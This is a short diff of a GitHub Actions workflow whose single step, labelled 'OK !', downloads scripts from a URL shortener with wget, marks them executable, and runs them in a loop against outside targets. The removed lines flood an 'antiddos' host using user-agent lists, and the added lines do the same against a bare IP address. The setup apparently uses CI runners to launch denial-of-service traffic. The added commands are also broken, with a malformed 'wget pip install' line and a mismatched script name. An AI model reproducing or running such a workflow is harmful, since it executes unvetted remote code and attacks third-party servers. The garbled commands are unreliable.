@@ -15,14 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/i5xqE/xnet.js
-          wget https://curl.by/IJ_Lv/fres.txt
-          wget https://curl.by/FVlpp/ua.txt
-          npm i header-generator user-agents
-          chmod +x xnet.js
+          wget pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/I_c05/testraw.js
+          wget https://curl.by/vAY6g/Test.py
+          chmod +x testraw.js
+          chmod +x Test.py
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node xnet.js https://antiddos.ooguy.com/ 100 64 10
+            timeout 105 python3 Test.py http://31.40.197.248/ && node Test.js http://31.40.197.248/ 666
             PIDS+=($!)
           done
           
